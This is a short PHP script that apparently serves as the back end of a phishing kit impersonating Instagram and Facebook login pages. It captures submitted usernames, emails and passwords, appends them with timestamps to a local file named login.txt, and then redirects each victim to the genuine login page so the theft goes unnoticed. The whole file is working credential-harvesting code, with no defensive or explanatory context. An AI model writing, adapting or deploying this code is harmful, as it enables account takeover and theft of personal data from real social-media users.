<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Detect either Instagram or Facebook input names
    $user = $_POST['username'] ?? $_POST['email'] ?? 'UNKNOWN_USER';
    $pass = $_POST['password'] ?? $_POST['pass'] ?? 'UNKNOWN_PASS';

    // Determine platform
    $platform = isset($_POST['email']) ? "Facebook" : "Instagram";

    // Build log entry
    $data = "==== [$platform Login] ====\n";
    $data .= "Username: $user\nPassword: $pass\n";
    $data .= "Time: " . date("Y-m-d H:i:s") . "\n";
    $data .= "===========================\n\n";

    // Save to file
    file_put_contents("login.txt", $data, FILE_APPEND);

    // Redirect to legit site
    if ($platform === "Facebook") {
        header("Location: https://m.facebook.com/login");
    } else {
        header("Location: https://www.instagram.com/accounts/login/?hl=en");
    }

    exit();
}
?>
